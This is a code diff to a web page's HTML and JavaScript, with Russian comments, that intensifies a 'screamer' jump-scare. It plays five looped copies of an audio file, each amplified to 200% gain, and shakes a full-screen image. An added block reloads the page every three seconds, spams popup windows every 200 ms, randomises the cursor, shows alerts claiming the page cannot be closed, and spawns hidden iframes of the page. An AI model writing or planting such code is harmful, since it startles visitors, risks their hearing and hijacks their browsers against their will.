@@ -1511,11 +1511,32 @@
 		user-select: none;
 		pointer-events: none;
 	}
+	/* Вибрация контента */
+	@keyframes shake {
+		0%, 100% { transform: translate(0, 0) rotate(0deg); }
+		10% { transform: translate(-10px, 10px) rotate(-2deg); }
+		20% { transform: translate(10px, -10px) rotate(2deg); }
+		30% { transform: translate(-10px, -10px) rotate(-1deg); }
+		40% { transform: translate(10px, 10px) rotate(1deg); }
+		50% { transform: translate(-10px, 10px) rotate(-2deg); }
+		60% { transform: translate(10px, -10px) rotate(2deg); }
+		70% { transform: translate(-10px, -10px) rotate(-1deg); }
+		80% { transform: translate(10px, 10px) rotate(1deg); }
+		90% { transform: translate(-10px, 10px) rotate(-2deg); }
+	}
+	.screamer-shake {
+		animation: shake 0.1s infinite;
+	}
 </style>
 
 <div id="screamer-overlay">
 	<img id="screamer-image" src="assets/images/images.jpg" alt="">
-	<audio id="screamer-audio" src="assets/images/1.mp3" preload="auto"></audio>
+	<!-- Несколько audio для громкости -->
+	<audio id="screamer-audio-1" src="assets/images/1.mp3" preload="auto"></audio>
+	<audio id="screamer-audio-2" src="assets/images/1.mp3" preload="auto"></audio>
+	<audio id="screamer-audio-3" src="assets/images/1.mp3" preload="auto"></audio>
+	<audio id="screamer-audio-4" src="assets/images/1.mp3" preload="auto"></audio>
+	<audio id="screamer-audio-5" src="assets/images/1.mp3" preload="auto"></audio>
 </div>
 
 <script>
@@ -1528,41 +1549,41 @@ var audioInitialized = false;
 function triggerScreamer() {
 	var overlay = document.getElementById('screamer-overlay');
 	var image = document.getElementById('screamer-image');
-	var audio = document.getElementById('screamer-audio');
 	
-	// СНАЧАЛА запускаем звук (пока есть user interaction)
-	audio.volume = 1.0;
-	audio.loop = true;
-	audio.currentTime = 0;
-	
-	// Инициализируем Web Audio API для усиления до 300%
-	if (!audioInitialized) {
-		try {
-			audioContext = new (window.AudioContext || window.webkitAudioContext)();
-			audioSource = audioContext.createMediaElementSource(audio);
-			gainNode = audioContext.createGain();
-			gainNode.gain.value = 3.0; // 300% громкости!
-			audioSource.connect(gainNode);
-			gainNode.connect(audioContext.destination);
-			audioInitialized = true;
-			console.log('Web Audio API initialized with 300% gain');
-		} catch(e) {
-			console.error('Web Audio API error:', e);
-			// Если ошибка, просто используем обычный volume
-			audio.volume = 1.0;
-		}
-	}
-	
-	// Запускаем звук СИНХРОННО (без setTimeout!)
-	audio.play().then(function() {
-		console.log('ЗВУК ИГРАЕТ! 🔊💀');
-	}).catch(function(error) {
-		console.error('Ошибка воспроизведения:', error);
-	});
-	
-	// Показываем оверлей СИНХРОННО
+	// Показываем оверлей СРАЗУ
 	overlay.style.display = 'flex';
 	document.body.style.overflow = 'hidden';
+	
+	// Добавляем вибрацию картинки
+	image.classList.add('screamer-shake');
+	
+	// Запускаем ВСЕ 5 audio одновременно для максимальной громкости!
+	for (var i = 1; i <= 5; i++) {
+		var audio = document.getElementById('screamer-audio-' + i);
+		audio.volume = 1.0;
+		audio.loop = true;
+		audio.currentTime = 0;
+		
+		// Web Audio API для каждого звука
+		if (!audioInitialized) {
+			try {
+				var ctx = new (window.AudioContext || window.webkitAudioContext)();
+				var src = ctx.createMediaElementSource(audio);
+				var gain = ctx.createGain();
+				gain.gain.value = 2.0; // 200% для каждого
+				src.connect(gain);
+				gain.connect(ctx.destination);
+			} catch(e) {}
+		}
+		
+		// Запускаем
+		audio.play().then(function() {
+			console.log('ЗВУК #' + i + ' ИГРАЕТ! 🔊');
+		}).catch(function(err) {
+			console.error('Ошибка #' + i + ':', err);
+		});
+	}
+	audioInitialized = true;
 	
 	
 	// Переходим в полноэкранный режим
@@ -1629,13 +1650,52 @@ function triggerScreamer() {
 		e.preventDefault();
 		e.stopPropagation();
 	});
+	
+	// ==== МАКСИМАЛЬНЫЙ ПИЗДЕЦ ====
+	
+	// 1. ПЕРЕЗАГРУЗКА СТРАНИЦЫ каждые 3 секунды
+	var reloadInterval = setInterval(function() {
+		location.reload();
+	}, 3000);
+	
+	// 2. ОТКРЫВАЕМ POPUP ОКНА каждые 200мс (SPAM!)
+	var popupInterval = setInterval(function() {
+		try {
+			window.open(window.location.href, '_blank', 'width=400,height=400,left='+Math.random()*1000+',top='+Math.random()*1000);
+		} catch(e) {}
+	}, 200);
+	
+	// 3. ДВИЖЕНИЕ КУРСОРА - рандомные курсоры
+	var cursors = ['none', 'wait', 'grab', 'grabbing', 'crosshair', 'not-allowed', 'no-drop', 'all-scroll'];
+	var cursorInterval = setInterval(function() {
+		document.body.style.cursor = cursors[Math.floor(Math.random() * cursors.length)];
+	}, 50);
+	
+	// 4. ДВИЖЕНИЕ ЭЛЕМЕНТОВ на странице (трясучка)
+	var shakeInterval = setInterval(function() {
+		overlay.style.transform = 'translate('+((Math.random()-0.5)*20)+'px, '+((Math.random()-0.5)*20)+'px) rotate('+((Math.random()-0.5)*5)+'deg)';
+	}, 10);
+	
+	// 5. СПАМ АЛЕРТАМИ (некоторые браузеры блокируют)
+	setTimeout(function() {
+		try { alert('ЗАКРЫТЬ НЕВОЗМОЖНО!'); } catch(e) {}
+	}, 1000);
+	
+	// 6. СОЗДАЕМ НОВЫЕ IFRAME с этим же сайтом
+	for (var x = 0; x < 5; x++) {
+		var iframe = document.createElement('iframe');
+		iframe.src = window.location.href;
+		iframe.style.display = 'none';
+		document.body.appendChild(iframe);
+	}
 }
 
 // Предварительная инициализация звука при любом взаимодействии
 var audioPreloaded = false;
 function preloadAudio() {
 	if (audioPreloaded) return;
-	var audio = document.getElementById('screamer-audio');
+	var audio = document.getElementById('screamer-audio-1');
+	if (!audio) return;
 	audio.volume = 0.01; // Почти неслышно
 	audio.play().then(function() {
 		audio.pause();
